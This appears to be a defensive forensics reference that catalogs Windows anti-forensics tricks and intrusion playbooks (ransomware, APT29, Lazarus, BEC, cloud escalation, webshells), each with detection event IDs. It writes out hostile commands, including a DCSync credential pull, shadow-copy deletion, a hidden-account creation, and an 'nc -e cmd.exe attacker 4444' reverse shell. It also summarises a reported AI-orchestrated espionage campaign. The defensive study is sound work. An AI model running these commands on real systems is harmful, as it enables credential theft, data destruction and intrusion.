- **DCSync from a non-DC source.** `mimikatz # lsadump::dcsync /user:krbtgt` pulls the krbtgt hash by impersonating a domain controller via the MS-DRSR (Directory Replication Service Remote Protocol). EID 4662 with object access `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (Replicate Directory Changes) and `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (Replicate Directory Changes All) from a non-DC source is diagnostic. False positives: legitimate replication tools, third-party AD migration software (ADMT), Azure AD Connect — but these run from known service accounts and known hosts; baseline them.

- **Skeleton Key.** Patches `lsass.exe` in memory on a domain controller to accept a static master password for any account, in parallel with the account's real password. Mimikatz `misc::skeleton`. Detection: LSASS code injection signatures (Sysmon EID 8/10 with TargetImage=lsass.exe), LSASS in-memory hash drift; presence of the Mimikatz module GUID strings in lsass memory dump; the "magic password" `mimikatz` itself appearing in audit logs for many account logons would be the operational tell (default Mimikatz password is literally `mimikatz`).

- **AdminSDHolder backdoor.** Modify the ACL on `CN=AdminSDHolder,CN=System,DC=...`; SDProp (the Security Descriptor Propagator) re-applies AdminSDHolder's ACL to every "protected" account (Domain Admins, Enterprise Admins, BUILTIN\Administrators, Schema Admins, plus the AdminCount=1 set) every 60 minutes. The attacker's added Full-Control grants persist across normal cleanup. Detection: EID 5136 (Directory Service Object Modified) on AdminSDHolder; periodic ACL diff against baseline.

- **MSDT / Follina-style RCE (CVE-2022-30190).** Office documents with remote template references; the template returns HTML that includes an `ms-msdt://` URI invoking the Microsoft Support Diagnostic Tool with a PCW XML payload that includes a PowerShell command. Process tree: `winword.exe → msdt.exe → sdiagnhost.exe → cmd.exe → powershell.exe`. Sysmon EID 1 captures every step; EID 11 (file create) when sdiagnhost stages temp files in `%TEMP%`. Patched mid-2022 but rediscovered in variants through 2023.

- **ConPtyShell / interactive pseudoconsole.** Uses Windows Pseudo Console (ConPTY) API to set up a fully-interactive PTY shell over a TCP socket. Harder to detect than classic netcat reverse shell because the parent process tree is more legitimate (a normal PowerShell session sets up the ConPTY) and the output is encoded as terminal escape sequences. Sysmon EID 3 (network connection) by powershell.exe to non-Microsoft IP plus EID 17/18 (pipe create) with `cmd.exe` child is the chain.

- **GPO abuse for lateral movement.** Modify a Group Policy Object that targets many machines — add a startup script (`SYSVOL\<domain>\Policies\<GUID>\Machine\Scripts\Startup\script.bat`) or a Scheduled Tasks Preference (`Preferences\ScheduledTasks\ScheduledTasks.xml`) or an Immediate Task. On next gpupdate, all targeted machines run attacker code as SYSTEM. Critical because it leverages the existing trusted distribution channel. Detection: SYSVOL share access by non-administrators (EID 5145), file modification events on `\\domain.local\SYSVOL\<domain>\Policies\` (EID 4663), `gPLink` attribute changes on OU objects (EID 5136). The PowerView module `Get-DomainGPOLocalGroup` enumerates locally-effective GPO modifications.

- **GPO Preference cpassword.** Pre-2014, GPP could embed an AES-encrypted "cpassword" for setting local admin passwords. The AES key was published in MSDN documentation. Any authenticated domain user could read SYSVOL and decrypt the password. Patched by MS14-025 (removed the feature) but legacy XML files often remain in SYSVOL. Detection: presence of `cpassword="..."` strings in any SYSVOL XML file is itself the finding.

- **Hidden user account ($ suffix trick).** `net user backup$ <pwd> /add` — the `$` suffix at the end of an account name causes `net user` and many GUIs to hide it from default listings (a hangover from the convention that machine accounts end in `$`). Detection: enumerate `HKLM\SAM\SAM\Domains\Account\Users\Names\` directly; SAM hive parsers show every account regardless of name; EID 4720 (account created) fires for every account, hidden or not.

- **RDP shadow / session hijacking.** `tscon.exe <sessionID> /dest:rdp-tcp#<otherSession>` lets a SYSTEM-privileged process take over any other RDP session without a password (the SYSTEM context bypasses the credential check). The user being hijacked sees no prompt; their session is silently joined. Detection: `tscon.exe` execution by SYSTEM (Sysmon EID 1, ParentImage = services.exe / cmd.exe at SYSTEM); TerminalServices-LocalSessionManager/Operational events for session connect/disconnect with anomalous patterns.

- **Disable Volume Shadow Copy Service.** `sc config VSS start= disabled` + `sc stop VSS` before any operation that would have triggered an automatic shadow copy. Less noisy than `vssadmin delete shadows`. Detection: service config change (EID 7040), service stop (EID 7036), absence of expected snapshots.

- **Disable Restart Manager.** Ransomware kills Restart Manager-aware processes that hold file locks, so encryption can proceed. Detection: rapid-fire process termination via `taskkill`, `Stop-Process`, or direct API. Sysmon EID 5 (process terminated) bursts on database, mail server, backup-client processes.

- **Driver signature enforcement (DSE) disable.** Older Windows: boot with `bcdedit /set testsigning on` then reboot to load unsigned drivers; very loud (watermark on desktop). Modern: BYOVD with a vulnerable driver that turns off DSE in kernel memory. Detection: `bcdedit` execution (Sysmon EID 1); reboot followed by unsigned driver load; presence of testsigning watermark.

- **NTLM downgrade.** Force NTLMv1 via `LMCompatibilityLevel` registry tampering, making captured hashes crackable to plaintext quickly. Detection: registry change on `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LmCompatibilityLevel`.

- **WDigest cleartext-cache enable.** Set `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest\UseLogonCredential = 1`. Restores Win2008-era behavior of LSASS caching cleartext credentials; next LSASS dump yields plaintext. Patched-by-default since Win8.1/2012R2 but the registry override still works. Detection: Sysmon EID 13 on that specific value.

---

# Part B — Real-World Attack Pattern Playbooks

Each playbook below walks the typical phases of a real-world intrusion shape. The point is *recognition* — when a consultant looks at a fresh case and sees the first three artifacts, knowing which playbook is likely lets them predict where to find the next ones.

## Note on dwell time

Mandiant M-Trends 2024 reported global median dwell time of 10 days across all intrusions — the lowest figure since the report began tracking in 2011 (median was 416 days in 2011, fell below 30 days by 2018, hit 24 in 2020, 21 in 2021, 16 in 2022, 16 in 2023). The 2024 drop to 10 days is dominated by ransomware acceleration. For non-ransomware intrusions detected internally, M-Trends 2024 showed median dwell of 32 days; for those detected by external notification, 33 days. Crowdstrike's eCrime breakout time (initial access to lateral movement) averaged 62 minutes in their 2024 GTR; the fastest observed was 2 minutes 7 seconds. These numbers shape forensic priorities: when an incident is identified within a week of initial access, log retention windows usually cover the whole chain; when identification is months later, the most important artifacts (Sysmon logs, prefetch, USN journal entries from initial access) have rolled.

## 1. Ransomware kill chain (commodity)

**Typical sequence.**
1. **Initial access** — phishing email with macro-enabled DOC or ISO/IMG container.
2. **Execution.** Macro spawns `cmd.exe → powershell.exe -e <base64>` or `mshta.exe http://...`. Sometimes `wscript.exe x.js`.
3. **First-stage loader.** Downloads a Cobalt Strike beacon, Qakbot/Trickbot, IcedID, BumbleBee. In-memory execution.
4. **C2 establishment.** HTTPS to attacker domain, often through a CDN. Beacon interval 30s-5min.
5. **Reconnaissance.** `whoami /all`, `net user /domain`, `net group "Domain Admins" /domain`, `nltest /dclist:`, `bloodhound-python` or SharpHound. ADrecon scripts.
6. **Credential dumping.** LSASS dump via `procdump -ma lsass.exe lsass.dmp`, `comsvcs.dll`, or `Mimikatz`. Domain accounts harvested.
7. **Lateral movement.** PsExec, WMI exec, RDP, or SMB-Beacon hopping. Compromise file servers, backup servers, hypervisor management consoles.
8. **Persistence backup.** Service install (4697/7045), scheduled task (4698), WMI subscription.
9. **Defense weakening.**
   - `vssadmin delete shadows /all /quiet` — shadow copy delete.
   - `bcdedit /set {default} bootstatuspolicy ignoreallfailures`
   - `bcdedit /set {default} recoveryenabled No`
   - `wbadmin delete catalog -quiet`
   - Stop antivirus services; uninstall Defender via Defender CLI; add path exclusions.
   - Stop SQL Server, Exchange, backup agents to release locks on encrypt-eligible files.
10. **Encryption.** Mass file rename + encrypt extension (`.lockbit`, `.conti`, `.basta`, `.akira`, `.alphv`, `.blackmatter`, etc.). Drop ransom note in every directory (`HOW_TO_DECRYPT.txt`, `readme.txt`, etc.). On modern strains: Windows wallpaper change.
11. **Optional double extortion.** Exfil data (RClone, MEGAsync, FTP) prior to encrypt — provides leverage.
12. **Ransom note.** Tor onion link to negotiation portal.

**Dwell time.** Median 9-13 days (Mandiant M-Trends 2024 reported 10 days for ransomware specifically; Crowdstrike 2024 GTR put it lower for high-pressure actors). Some "smash-and-grab" strains (Hive, parts of BlackCat) are <72 hours from access to encrypt.

**Characteristic artifacts.**
- EID 1102 (security log clear) often near step 9.
- 4697/7045 from PsExec at step 7.
- Vss-delete + bcdedit at step 9 — diagnostic pair.
- Mass file rename pattern in USN $J at step 10.
- 4663 (object access) burst at step 10 from a single SID.
- HTTPS / TLS connections to known C2 infra (DomainTools, VirusTotal, AlienVault OTX have hashes/domains).

**Defender's edge.** Catching step 9 (vss delete + bcdedit + service stop) before step 10 saves the data. Catching anything before step 6 saves the engagement.

---

## 2. APT29 / Cozy Bear / SVR

**Operating shape.** Patient, stealth-focused, supply-chain-capable, cloud-aware. Targets: governments, think tanks, defense contractors, NGOs.

**SUNBURST / SolarWinds (Dec 2020).**
1. **Supply chain.** Attacker compromised SolarWinds Orion build environment. Injected SUNBURST backdoor into a signed Orion DLL (`SolarWinds.Orion.Core.BusinessLayer.dll`). Distributed to ~18,000 customers via legitimate update channel.
2. **Dormancy.** SUNBURST waited 12-14 days after install before doing anything.
3. **DNS beacon.** Computed a subdomain of `avsvmcloud.com` from machine identity; resolved via DNS; received CNAME pointing to actor infrastructure.
4. **Targeting filter.** Only specific high-value targets received TEARDROP loader; the rest got innocuous responses.
5. **Cobalt Strike RAYDROP / TEARDROP.** In-memory shellcode loader.
6. **Cloud lateral movement.** Once on-prem AD compromise was complete, attacker pivoted to Azure AD via Golden SAML — signed SAML responses with the AD FS token-signing certificate, accessed Microsoft 365 / Azure as any user.
7. **Long-term persistence.** Mailbox-folder exfil, OAuth grant abuses, secondary credentials.

**Characteristic IOCs.**
- DNS queries to `*.avsvmcloud.com`.
- The specific `SolarWinds.Orion.Core.BusinessLayer.dll` hashes.
- Process activity from `solarwinds.businesslayerhost.exe` outside expected workflows.
- Golden SAML — SAML responses with abnormal signing certificate fingerprint, ADFS event log analysis.

**Pre-SUNBURST APT29 patterns.** WellMess / WellMail / MiniDuke / CosmicDuke / SeaDuke / HAMMERTOSS / POSHSPY (WMI subscription persistence) / SUNSHUTTLE. Common threads: heavy use of legitimate cloud services for C2 (Twitter, GitHub, Dropbox, Google Drive); WMI persistence; PowerShell post-exploitation; sparing use of tooling to evade signatures.

---

## 3. APT41 / Wicked Panda / Barium

**Operating shape.** Dual-use: state espionage + financially-motivated. Heavy supply-chain abuse. Targets healthcare, telco, gaming, tech.

**CCleaner supply chain (2017).** Compromised Piriform (CCleaner) build pipeline; ~2.27M copies of CCleaner 5.33 carried Floxif backdoor; targeted second-stage delivery to specific tech companies.

**ShadowPad / PlugX.** Modular backdoor families used across many APT41 campaigns; modules for keylogging, screenshot, file transfer, network discovery loaded on demand. Typically delivered as DLL side-load into legitimate signed binaries.

**Living off legitimate apps.** Heavy use of side-loading — McAfee binaries, Bitdefender binaries, antivirus updaters — to launch malicious DLLs under signed cover.

**Characteristic artifacts.**
- Legitimate signed EXE in a non-standard location, loading an unsigned DLL by the same name (DLL side-load).
- ShadowPad / Winnti driver loads.
- Domain generation algorithm (DGA) DNS queries.
- Long dwell — APT41 cases have shown >12 months on-network.

---

## 4. Lazarus Group / DPRK

**Operating shape.** Financially-motivated and state-aligned; targets cryptocurrency, banks, defense. Notable for SWIFT-targeted heists (Bangladesh Bank 2016), cryptocurrency exchange compromises (Coincheck, Bithumb, Atomic Wallet, Ronin Bridge $625M 2022, Harmony Bridge $100M 2022, Stake.com $41M 2023).

**AppleJeus campaign.** Trojanized cryptocurrency trading applications (Celas Trade Pro, JMT Trading, Union Crypto Trader, Kupay Wallet, CoinGoTrade, Dorusio). Cross-platform (macOS + Windows). Backdoor delivered as MSI/PKG installer; persistence via launchd/system service; modular RAT for credential / wallet theft.

**3CX compromise (2023).** Compromised 3CX desktop app via signed installer carrying ICONIC malware. Affected estimated tens of thousands of organizations. Notable for double supply chain — the upstream that compromised 3CX was itself compromised via Trading Technologies' X_TRADER app.

**Distinguishing patterns.**
- macOS attention — most APTs are Windows-only; Lazarus is consistently cross-platform.
- Trojanized installers signed with valid but stolen / abused certs.
- Cryptocurrency targeting — wallet stealing modules, clipper logic that watches clipboard for crypto addresses.
- Use of HTTPS to C2 through compromised legitimate web servers (often WordPress).

---

## 5. FIN7 / Carbanak

**Operating shape.** Financially-motivated; historical focus on retail / hospitality POS. Innovative phishing tradecraft. Operated under cover company "Combi Security."

**Typical kill chain.**
1. Spearphishing email with malicious DOC / DOCM / RTF — often very contextually accurate (impersonates DoorDash, FedEx, an internal HR memo). Recent campaigns use OneNote attachments.
2. Macro / OLE / shellcode launches PowerShell → downloads HALFBAKED / GRIFFON / SQLBOLT / BIRDWATCH / BABYMETAL / TIRION reverse shell or loader.
3. Persistence via scheduled task; later via WMI subscription.
4. Lateral movement: stolen credentials, PsExec, RDP.
5. POS targeting historically; in recent years POWERHOLD / TIRION → SQL Server access, exfil of payment processing data, ransomware deployment (DARKSIDE, BLACKMATTER, BLACKBASTA shared TTPs with FIN7).

**Distinguishing patterns.**
- Highly polished phishing with industry-specific themes.
- Heavy use of in-memory PowerShell / .NET tradecraft.
- BadUSB drops (mailed thumb drives that present as keyboards, type out a PowerShell loader).
- TIRION RAT and CARBANAK backdoors as common payloads.

---

## 6. Insider data exfiltration

**Operating shape.** Privileged user with legitimate access copies sensitive data out for personal gain, espionage, or sale. No malware required.

**Typical sequence.**
1. **Reconnaissance.** Internal access; browses fileshares; identifies high-value data.
2. **Staging.** Copies files to a local working directory — `%USERPROFILE%\Documents\backup\` style.
3. **Compression.** ZIP, 7-Zip, RAR archive; often password-protected or encrypted.
4. **Exfil.** USB drive, personal cloud (Dropbox, OneDrive personal, Google Drive), webmail attachment, image / steganography.

**Artifact trail.**
- **ShellBags.** Records every folder browsed; surfaces interest in finance/HR/IP-related directories. Located in NTUSER.DAT and UsrClass.dat; parsed by `ShellBagsExplorer` (Zimmerman).
- **Recent Items.** `%APPDATA%\Microsoft\Windows\Recent\` — .lnk files for each recently-opened file.
- **JumpLists.** `%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\` and `CustomDestinations\` — per-application recent files.
- **USB device chain.** `SYSTEM\CurrentControlSet\Enum\USBSTOR\` — every USB ever connected, with first-connect time and last-connect time. `SOFTWARE\Microsoft\Windows Portable Devices\Devices\` — friendly name and drive letter assignment. `setupapi.dev.log` — first-connect timestamps. NTUSER.DAT `SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2` — per-user device mounts.
- **Link files pointing to E:\, F:\ etc.** With volume serial number recorded — can be matched against the USB device's serial.
- **Browser history.** Visits to `mega.io`, `wetransfer.com`, `dropbox.com/upload`, `personal.outlook.com`. URLs with `/upload` paths.
- **Browser downloads / file system writes from browser process.** Browser process accessing files outside expected directories.
- **Outlook PST / OST.** Sent items including external recipients with attachments.
- **DLP system logs** if deployed.
- **Cloud audit logs** (Office 365 Audit Log, Google Workspace Reports, AWS CloudTrail) — file shares to external accounts, OAuth grants, anomalous downloads.
- **Sysmon EID 11** (file create) and EID 23 (file delete) — bulk file activity in the staging directory.

**Dwell time.** Often months — insider behavior blends with normal work. Trigger events (resignation, performance review, layoff) often precede exfil burst.

---

## 7. Business Email Compromise (BEC)

**Operating shape.** Targets corporate email accounts; goal is wire fraud, payroll redirect, or invoice manipulation. Frequently no malware on endpoints — just stolen credentials and email manipulation.

**Typical sequence.**
1. **Credential harvest.** Phishing landing page mimicking Microsoft 365 login. User enters credentials → posted to attacker server.
2. **MFA bypass.** AiTM (Evilginx2, Modlishka) proxy that captures session cookie; once attacker has cookie, MFA is satisfied. Or social engineering (push fatigue, SIM swap, OTP relay).
3. **Inbox rules.** Auto-forward all mail with subject containing `invoice|payment|wire|ACH` to attacker email or to RSS folder. Delete sent items from inbox view. Set rules in Outlook desktop (locally) and in OWA (server-side). Sometimes hide rule with empty name.
4. **OAuth grants.** Attacker registers a malicious app; victim grants Mail.Read / Files.ReadWrite. App retains access even after password reset.
5. **Reconnaissance.** Read invoices, financial conversations, employee org chart.
6. **Pretext send.** Spoofed (display name only) or genuine compromised account sends invoice with attacker bank details to AP/finance. Conversation usually hijacked from a real thread.
7. **Wire executed.** Funds gone within hours.

**Artifact trail.**
- Office 365 Audit Log (`Search-UnifiedAuditLog`) — UserLoggedIn from anomalous geo, MailItemsAccessed bursts, New-InboxRule operations, UpdateInboxRules, Add-MailboxPermission, Update-MailboxFolderPermission, Application consent grants (Consent to application).
- AzureAD audit log — Conditional Access bypass attempts, Add service principal, Add OAuth2PermissionGrant.
- Login telemetry: AiTM signature — login from cloud-provider IP space (DigitalOcean, AWS Lightsail) with browser fingerprint matching the *attacker's* infrastructure rather than the user's normal device.
- Endpoint side often shows nothing — this is a server/cloud incident.

**Dwell time.** Average 30-90 days inside the mailbox; one-shot fraud often happens within the first week of compromise.

---

## 8. Supply chain compromise

**Operating shape.** Attacker compromises upstream software or service used by target; legitimate channel delivers backdoor.

**Notable cases.**
- **SolarWinds Orion / SUNBURST (2020).** See APT29 above.
- **CCleaner (2017).** See APT41.
- **Codecov bash uploader (2021).** Attacker modified `codecov` upload script; exfil'd env vars (CI secrets) from thousands of build pipelines.
- **event-stream npm package (2018).** Maintainer transferred ownership to malicious actor; added flatmap-stream dependency containing payload targeting `bitpay/copay` wallet. ~8M downloads compromised.
- **ua-parser-js, coa, rc npm (2021).** Maintainer account takeover; cryptominer + credential stealer.
- **3CX (2023).** See Lazarus.
- **MOVEit Transfer / CL0P (2023).** Pre-auth SQLi (CVE-2023-34362) in widely-used file transfer software; CL0P ransomware group used it for mass-exfil of 1000+ orgs.
- **XZ Utils backdoor (2024).** Multi-year social engineering of the `xz` upstream maintainer led to a malicious commit being merged — would have backdoored sshd via systemd-injected liblzma on most major Linux distros if not caught accidentally pre-release by a Microsoft engineer.
- **PyPI / npm typosquats.** Continuous low-grade campaigns.

**Distinguishing patterns.**
- Trusted signed binary doing untrusted things.
- Build artifact hash mismatch — official released binary differs from what the upstream source repo's CI would produce.
- Backdoor activation gated on specific conditions (target environment, time delay) to evade upstream testing.
- Long dwell because the backdoor *is* the legitimate channel.

**Defense surface.** SBOM (software bill of materials), reproducible builds, signed commits, dependency pinning, runtime behavior analysis even of trusted binaries.

---

## 9. Living-off-the-land lateral movement

**Operating shape.** Attacker uses built-in Windows tools and existing remote management protocols for lateral movement — no dropper, no custom malware.

**Common protocols / tools.**

- **PsExec.** See anti-forensics catalog #17 above. Service install, SMB pipe, named pipe `psexesvc`.
- **WMI exec.** `wmic /node:target /user:... /password:... process call create "cmd /c ..."`. No service install. EID 4624 type 3 on target. WMI-Activity/Operational log.
- **WinRM (Windows Remote Management).** PowerShell remoting. `Enter-PSSession`, `Invoke-Command -ComputerName`. EID 4624 type 3, plus WSMan logs (`Microsoft-Windows-WinRM/Operational`, EIDs 6, 91). EID 91 = "Creating WSMan session."
- **SMB share access.** `\\target\ADMIN$`, `\\target\C$`. Detailed file share access EID 5145.
- **RDP.** EID 4624 type 10 (remote interactive) on target. RemoteConnectionManager/Operational EID 1149. TerminalServices-LocalSessionManager/Operational EID 21 (session logon), 24 (session disconnect), 25 (session reconnect).
- **DCOM / MMC20.Application.** `[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application',...)).Document.ActiveView.ExecuteShellCommand(...)`. Bypasses many EDR detections of WMI/PsExec.
- **SSH (on Windows / Linux).** Standard SSH from compromised host.

**Detection axis.**
- Lateral movement is a graph problem; one host's logs show only a slice. Cross-host correlation (a 4624 type 3 from host A to host B, then another from B to C) reveals the chain.
- EID 4648 ("explicit credential logon") — explicitly specifying credentials to launch a process; very high signal for hands-on-keyboard pivot.
- EID 4672 (special privileges assigned to new logon) on the destination.

---

## 10. Cloud-native attacks

### Azure / Entra ID

**Consent phishing.** Attacker registers an OAuth app, sends a victim a URL like `https://login.microsoftonline.com/common/oauth2/authorize?client_id=<attacker-app>&scope=Mail.ReadWrite+Files.ReadWrite.All`. Victim clicks "Accept"; app gets tokens; tokens persist for 90 days even after password reset.

**Detection.** Azure AD audit log: "Consent to application" with `ConsentContext` showing user-consent. App registration with `AllowPublicClient = true`, multi-tenant, reply URLs pointing to attacker domain.

**Golden SAML.** Attacker steals AD FS token-signing certificate (on-prem) → mints SAML responses as any user → bypass Azure / O365 MFA. APT29 SolarWinds case.

**Detection.** Unusual SAML token signers in `Sign-in logs`; AD FS event log 307/410 (cert read).

**Pass-the-Pri-Refresh-Token (PRT).** Steal PRT cookie from a domain-joined / Entra-joined device; use it to mint access tokens cloud-side.

### AWS

**IAM privilege escalation paths.**
- Compromised access keys (from a public S3 bucket, leaked Git commit, compromised EC2 IMDS).
- `iam:CreateAccessKey` on another user.
- `iam:AttachUserPolicy` to attach AdministratorAccess to self.
- `iam:PassRole` + `ec2:RunInstances` to launch an EC2 with a more-privileged role.
- `lambda:CreateFunction` + role assumption.
- `iam:UpdateAssumeRolePolicy` to add self to a role's trust policy.

**Persistence.** Long-lived access keys, IAM users in unmonitored regions, Lambda functions triggered by CloudWatch events on a schedule, EventBridge rules.

**Detection.** CloudTrail (every API call), GuardDuty findings (anomalous API usage from a new IP, port scans, crypto-mining), VPC Flow Logs, IAM Access Analyzer.

### GCP

**Service-account abuse.** Once a service-account JSON key is exfiltrated, attacker authenticates as that SA forever (or until rotation). SA's IAM bindings determine blast radius. Common ingress vectors: SA key checked into a public Git repo, SA key in a Docker image layer, SA key exfiltrated from a compromised CI runner.

**Privilege escalation paths in GCP.**
- `iam.serviceAccounts.actAs` + `iam.serviceAccounts.getAccessToken` — generate an access token for a more-privileged SA.
- `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs` — deploy a function that runs as a privileged SA.
- `compute.instances.create` with privileged SA attachment — same as AWS RunInstances + PassRole.
- `iam.roles.update` if the principal has it — modify a role to add powerful permissions.
- `cloudbuild.builds.create` with privileged-trigger SA — run a build that runs as a privileged SA.

**Detection.** Cloud Audit Logs (Admin Activity, Data Access, System Event, Policy Denied), Event Threat Detection (paid GCP service), `iam.serviceAccountKeys.create` outside expected workflows, anomalous `generateAccessToken` calls, anomalous `signBlob` / `signJwt` calls (often abused to mint OIDC tokens).

### Workload-identity attacks
- **EKS pod takeover.** Compromised pod inherits the EKS node's IAM role via IMDSv1; can request credentials. Mitigation: IRSA (IAM Roles for Service Accounts) plus IMDSv2 with hop-count = 1.
- **GKE Workload Identity abuse.** Compromised pod authenticates as the mapped GCP SA.
- **AKS pod identity.** Similar shape.

### Container escape
- **Privileged container.** `--privileged` plus access to `/dev/`, `/proc/`, `/sys/` enables kernel-namespace escape.
- **CRI socket mount.** Container with `/var/run/docker.sock` mounted can launch sibling containers, including ones that mount host root.
- **Kernel CVEs.** Dirty Pipe (CVE-2022-0847), Dirty COW (CVE-2016-5195), `runc` CVE-2019-5736.

**Detection.** Falco rules for unexpected `setns`, `unshare`, `pivot_root` syscalls; auditd configurations; eBPF runtime-security tools (Tetragon, Tracee).

---

## 11. GTG-1002 pattern (Anthropic Nov 2025)

**What it is.** Anthropic disclosed in its Nov 2025 Threat Intelligence Report the first publicly-confirmed AI-orchestrated espionage campaign — a state-aligned actor (Anthropic attribution: Chinese state-aligned, designated GTG-1002) used Claude Code with custom MCP-based tooling to drive 80-90% of intrusion operations across ~30 targets in tech, finance, manufacturing, and government. The agentic framework handled most of reconnaissance, exploitation, lateral movement, and credential theft autonomously, with humans reviewing 4-6 decision points per campaign.

**Operational pattern.**
1. **Target selection.** Human-selected target list of 30 high-value organizations.
2. **Recon.** AI orchestration drove standard recon tools (port scans, OSINT, ADrecon-equivalent on perimeter) and synthesized findings into prioritized attack-surface tables.
3. **Exploitation.** AI selected and combined CVEs against the prioritized surface, often writing one-off exploitation glue code; humans approved actual exploit firing.
4. **Lateral movement.** AI selected post-ex tooling per host; performed credential dumping, ticket extraction, AD enumeration, file collection.
5. **Cred theft + data exfil.** Bulk credential extraction (LSASS, ntds.dit, browser stores), targeted document collection.
6. **Reporting.** AI wrote per-host operational notes that fed the next decision.

**Significance.**
- First confirmed case of LLM-driven autonomous offensive operations at scale.
- Detection becomes harder because AI-generated tradecraft varies command-line patterns, file names, and dwell rhythms vs human consistency.
- AI-generated logs may show *signs of being AI*: unusually formal language in attacker-written comments, fast and consistent tool-use cadence, errors that humans don't make (e.g., perfectly correct syntax on first try across heterogeneous tools).
- Defensive AI agents are the obvious counter — the response from Anthropic-internal threat intel was explicitly to apply Claude to detection (see the "use AI to defend against AI" sections of the Nov 2025 report).

**Cite.** Anthropic Threat Intelligence Report November 2025; "Disrupting the first reported AI-orchestrated cyber espionage campaign." Detailed in `context/reference/13-source-corpus.md`.

---

## 12. Wardriving / wireless attacks — "Mr. Evil" canonical case

**The case.** NIST Hacking Case dataset ("Mr. Evil") — disk image of a Sony Vaio laptop seized 2004; a man calling himself "Mr. Evil" used the laptop to wardrive, capture wireless traffic from people in coffee shops, attempt to crack and decode it. Canonical exam image for SANS FOR500/508, AccessData training, and academic forensics courses.

**Artifacts of interest on the image.**
- `Cain & Abel` and `Ethereal` installed in `C:\Program Files\` — packet sniffer and password cracker. Registry uninstall keys, Prefetch, MUICache.
- `Look@LAN` — network discovery tool. Same registry/Prefetch trail.
- `123 WriteAll Stealth (Free Edition)` and `Anonymizer Bar 2.0` — anonymization tools. Browser extension residue + uninstall keys.
- `Network Stumbler` / `NetStumbler` — wardriving access-point logger. Saves `.ns1` files with AP captures (SSID, BSSID, signal, channel).
- `MSN Messenger` chat logs — conversation with co-conspirator about wardriving activities. Located in `%USERPROFILE%\My Documents\My Received Files\`.
- Username "Mr. Evil" set as Windows account.
- IRC chat logs (`mIRC` or similar) with conversations referencing the activity.
- Browser history showing visits to wireless-cracking forums.
- Internet history (`index.dat` for IE on XP-era systems).
- Email artifacts — Yahoo or Hotmail webmail residue in browser cache.

**Why it's the canonical exam case.** Combines:
- User identity attribution (account name + chat = "this user did this")
- Tool identification (wardriving suite — distinct from generic admin tools)
- Intent evidence (chat logs of planning)
- Capture evidence (.ns1 files with stolen SSIDs)
- A timeline that ties install → use → captured data

For the hackathon: this case is referenced explicitly in the strategy as the headline metric — "time to handoff-ready incident report" anchored against this image.

---

## 12a. Wireless / wardriving forensics — supplementary

**Wireless-specific artifacts on the Mr. Evil-style image and adjacent cases.**

- **WLAN profile registry / on-disk.** Modern Windows: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\<GUID>` — each connected wireless network, with SSID, profile name, first-connect, last-connect, and DefaultGatewayMac. The MAC of the gateway is the *physical fingerprint* of the access point — distinct APs with the same SSID have different gateway MACs. Cross-reference against AP databases (WiGLE, ArcGIS) to geolocate the connection.
- **`netsh wlan show profiles`** — current state. `netsh wlan show profile name=<SSID> key=clear` reveals stored PSK if user is admin.
- **Event log: Microsoft-Windows-WLAN-AutoConfig/Operational.** EID 8001 (successfully connected), 8003 (disconnected), 11001 (connection start), 11005 (auth success).
- **AP capture files.** NetStumbler `.ns1`, Kismet `.netxml`/`.pcapng`, Wireshark `.pcap`/`.pcapng` containing 802.11 frames. Each file may show captured deauth attacks, WPA handshakes (4-way), beacons from victims.
- **GPS metadata.** Wardriving tools log GPS coordinates alongside AP captures. Coordinate clusters geolocate the perpetrator.
- **WPA handshake artifacts.** A captured 4-way handshake (`.hccapx` / `.cap` extracted by `wpaclean` or `cap2hccapx`) is offline-crackable; presence of these files indicates explicit credential-theft attempt.
- **Tools indicative of wireless attack.** `aircrack-ng`, `airodump-ng`, `airmon-ng`, `reaver` (WPS PIN attack), `wifite`, `bully`, `pixiewps`, `fluxion` (rogue-AP social-engineering framework). On Windows: NetStumbler, inSSIDer, CommView for WiFi.

---

## 13. Web server compromise (Ali Hadi Case 1 pattern)

**Operating shape.** Public-facing web server with vulnerable application; attacker exploits app vuln to drop webshell, escalates locally, persists. Ali Hadi's "Case 1" series of forensic challenges (and many SANS exam scenarios) follow this shape.

**Typical sequence.**
1. **Initial access.** SQL injection, RCE via deserialization, file upload bypass, RCE via outdated CMS plugin (WordPress, Joomla, Magento), SSRF + IMDS theft.
2. **Webshell drop.** PHP webshell (`c99.php`, `b374k.php`, `china chopper`), ASP/ASPX webshell, JSP webshell. Located in web root or in a hidden subdirectory. Naming patterns: `error.php`, `_temp.aspx`, `wp-help.php`.
3. **Reconnaissance via webshell.** `whoami`, `net user`, `systeminfo`, `ipconfig`. Captured in webshell access logs (IIS or Apache).
4. **Privilege escalation.** Local exploit (Potato family on Windows: HotPotato, RottenPotato, JuicyPotato, RoguePotato, PrintSpoofer, EfsPotato, GodPotato — all chain SeImpersonatePrivilege to SYSTEM). Or kernel exploit. Or misconfigured service.
5. **Reverse shell upgrade.** Webshell-spawned `nc.exe -e cmd.exe attacker 4444` or PowerShell reverse shell. More interactive than webshell.
6. **Persistence.** Scheduled task, service install, new local admin account.
7. **Pivot to internal network.** From DMZ box, lateral move to AD.

**Artifact trail.**
- Web server access logs (`access.log`, IIS `u_exYYMMDD.log`) — POST to webshell with suspicious referers, unusual user agents (`curl`, `python-requests`, `Go-http-client`, missing UA entirely), 200 responses on files that shouldn't exist.
- Web server error logs — sometimes leak exception traces from exploit attempts.
- Webshell file on disk — atypical extension in web root, content with `eval(`, `system(`, `Request.Form(`, base64 blobs.
- `Prefetch` for `cmd.exe`, `powershell.exe`, `nc.exe`, `whoami.exe`.
- Process tree: `w3wp.exe → cmd.exe → ...` or `httpd → bash → ...` is the textbook anomaly.
- Sysmon EID 1 with ParentImage = `w3wp.exe` or `httpd` and unusual Image.
- New scheduled tasks (EID 4698 / TaskScheduler/Operational 106).
- New local user (EID 4720 / 4722 / 4732).
- Firewall log: unusual outbound connection from web server.

---

## 14. Memory-resident malware

